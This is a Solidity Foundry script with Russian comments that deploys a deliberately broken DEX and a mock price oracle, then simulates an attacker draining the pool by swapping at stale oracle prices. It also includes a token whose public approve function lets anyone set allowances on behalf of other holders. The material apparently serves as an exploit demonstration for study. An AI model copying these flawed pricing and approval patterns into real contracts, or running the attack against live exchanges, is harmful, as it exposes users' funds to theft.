// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {PermitOffchain, Wallet, IUniswapV2Pair} from "../src/Counter.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/contracts/access/Ownable.sol";

contract TestToken is ERC20 {
  address private _dex;

  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}


interface IOracle {
    function getPrice(address from, address to) external view returns (uint256);
}

contract BrokenDEX is Ownable {
    address public token1; // Первый токен
    address public token2; // Второй токен
    IOracle public priceOracle; // Оракул, предоставляющий текущий курс

    uint initialLiquidityOfToken1;
    uint initialLiquidityOfToken2;


    constructor(address _oracle) {
        priceOracle = IOracle(_oracle);
    }

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address token, uint amount) public onlyOwner {
        IERC20(token).transferFrom(msg.sender, address(this), amount);
    }

    function setInitialLiquidity(address token, uint amount) public onlyOwner {
        IERC20(token).transferFrom(msg.sender, address(this), amount);

        if (token == token1) {
            initialLiquidityOfToken1 = amount;
        }

        if (token == token2) {
            initialLiquidityOfToken2 = amount;
        }

    }

    function swap(address from, address to, uint amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens for swap");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Insufficient balance for swap");

        uint swapAmount = getSwapPrice(from, to, amount);

        // В пуле всегда остается минимум от 0.1 каждого токена
        if (to == token1) {
            require(IERC20(to).balanceOf(address(this)) >= swapAmount + initialLiquidityOfToken1 / 10, "Insufficient liquidity in DEX");
        } else {
            require(IERC20(to).balanceOf(address(this)) >= swapAmount + initialLiquidityOfToken2 / 10, "Insufficient liquidity in DEX");
        }

        // Выполняем swap
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).transfer(msg.sender, swapAmount);
    }

    function getSwapPrice(address from, address to, uint amount) public view returns (uint) {
        // Получаем внешний курс от оракула
        uint oraclePrice = priceOracle.getPrice(from, to);
        require(oraclePrice > 0, "Invalid oracle price");

        // Линейный расчет цены, базирующийся на курсе оракула
        console.log("amount", amount);
        console.log("Oracle Price", oraclePrice);
        console.log("Balance of dex", IERC20(from).balanceOf(address(this)));
        console.log("swapAmount", amount * oraclePrice / 10**10);

        return amount * oraclePrice / 10**10;
    }
}

contract MockOracle is Ownable {
    uint256 public priceToken1ToToken2; // Цена для обмена token1 на token2
    uint256 public priceToken2ToToken1; // Цена для обмена token2 на token1

    address public dexAddress; // Адрес DEX
    address public token1;     // Адрес токена 1
    address public token2;     // Адрес токена 2

    constructor(uint256 initialPriceToken1ToToken2, uint256 initialPriceToken2ToToken1) {
        priceToken1ToToken2 = initialPriceToken1ToToken2;
        priceToken2ToToken1 = initialPriceToken2ToToken1;
    }

    // Устанавливаем адреса DEX и токенов (только владелец)
    function setDexAndTokens(address _dex, address _token1, address _token2) public onlyOwner {
        dexAddress = _dex;
        token1 = _token1;
        token2 = _token2;
    }

    // Устанавливаем новые цены для обмена (только владелец)
    function setNewPrices() public onlyOwner {
        priceToken1ToToken2 = 10**10 * IERC20(token1).balanceOf(dexAddress) / IERC20(token2).balanceOf(dexAddress);
        priceToken2ToToken1 = 10**10 * IERC20(token2).balanceOf(dexAddress) / IERC20(token1).balanceOf(dexAddress);
    }

    // Возвращаем цену обмена в зависимости от токенов
    function getPrice(address from, address to) external view returns (uint256) {
        require(from == token1 || from == token2, "Invalid 'from' token address");
        require(to == token1 || to == token2, "Invalid 'to' token address");
        require(from != to, "Tokens must be different");

        if (from == token1 && to == token2) {
            return priceToken1ToToken2;
        } else if (from == token2 && to == token1) {
            return priceToken2ToToken1;
        }

        revert("Invalid token pair");
    }
}


contract CounterScript is Script {
    uint pk = vm.envUint("PRIVATE_KEY");
    address addr = vm.addr(pk);


    function setUp() public {}

    function run() public {
        // vm.startBroadcast(pk);

        // Шаг 1. Создаем MockOracle
        MockOracle mockOracle = new MockOracle(10**10, 10**10);
        console.log("MockOracle deployed at:", address(mockOracle));

        // Шаг 2. Создаем BrokenDEX
        BrokenDEX brokenDex = new BrokenDEX(address(mockOracle));
        console.log("BrokenDEX deployed at:", address(brokenDex));

        // Шаг 3. Создаем два токена ERC20
        TestToken token1 = new TestToken(address(brokenDex), "Token1", "TK1", 50000000000000000000000);
        TestToken token2 = new TestToken(address(brokenDex), "Token2", "TK2", 50000000000000000000000);

        console.log("Token1 deployed at:", address(token1));
        console.log("Token2 deployed at:", address(token2));

        // Шаг 4. Назначаем токены в DEX
        brokenDex.setTokens(address(token1), address(token2));

        // Шаг 5. Добавляем ликвидность в DEX
        token1.approve(address(brokenDex), 5000 * 10 ** token1.decimals());
        token2.approve(address(brokenDex), 5000 * 10 ** token2.decimals());

        brokenDex.setInitialLiquidity(address(token1), 5000 * 10 ** token1.decimals());
        brokenDex.setInitialLiquidity(address(token2), 5000 * 10 ** token2.decimals());

        console.log("Liquidity added to DEX");

        // Шаг 7: Добавляем ссылки на dex и токены в oracle

        mockOracle.setDexAndTokens(address(brokenDex), address(token1), address(token2));

        // Шаг 6. Минтим токены для "злоумышленника"
        address attacker = vm.addr(2); // Примерный адрес злоумышленника
        token1.transfer(attacker, 100 * 10 ** token1.decimals());
        token2.transfer(attacker, 100 * 10 ** token2.decimals());

        console.log("Tokens minted for attacker:", attacker);

        // Шаг 7. Злоумышленник начинает атаку
        // Код взломщика
        vm.startPrank(attacker);

        token1.approve(address(brokenDex), type(uint256).max);
        token2.approve(address(brokenDex), type(uint256).max);

        uint256 swapAmount = 10 * 10 ** token1.decimals();

        for (uint256 i = 0; i < 5; i++) {
            console.log("Attacker Token1 balance:", token1.balanceOf(attacker));
            console.log("Attacker Token2 balance:", token2.balanceOf(attacker));
            console.log("DEX Token1 reserve:", token1.balanceOf(address(brokenDex)));
            console.log("DEX Token2 reserve:", token2.balanceOf(address(brokenDex)));
            console.log("Attack round:", i + 1);

            brokenDex.swap(address(token1), address(token2), swapAmount);
        }

        vm.stopPrank();

        // Наш сторонний сервер зупсуа раз в n минут функцию обновление цены. 
        mockOracle.setNewPrices();

        // Хакер спутся n минут запускает новую транзакцию
        vm.startPrank(attacker);
        token1.approve(address(brokenDex), type(uint256).max);
        token2.approve(address(brokenDex), type(uint256).max);

        for (uint256 i = 0; i < 5; i++) {
            console.log("Attacker Token1 balance:", token1.balanceOf(attacker));
            console.log("Attacker Token2 balance:", token2.balanceOf(attacker));
            console.log("DEX Token1 reserve:", token1.balanceOf(address(brokenDex)));
            console.log("DEX Token2 reserve:", token2.balanceOf(address(brokenDex)));

            console.log("Attack round:", i + 1);
            brokenDex.swap(address(token1), address(token2), swapAmount);
        }

        console.log("Attack completed");
        console.log("Attacker Token1 balance:", token1.balanceOf(attacker));
        console.log("Attacker Token2 balance:", token2.balanceOf(attacker));
        console.log("DEX Token1 reserve:", token1.balanceOf(address(brokenDex)));
        console.log("DEX Token2 reserve:", token2.balanceOf(address(brokenDex)));
        // Суммарное число токенов у хакера увеличилось, на бирже уменьшилось 

        vm.stopPrank();


        // vm.stopBroadcast();
    }
}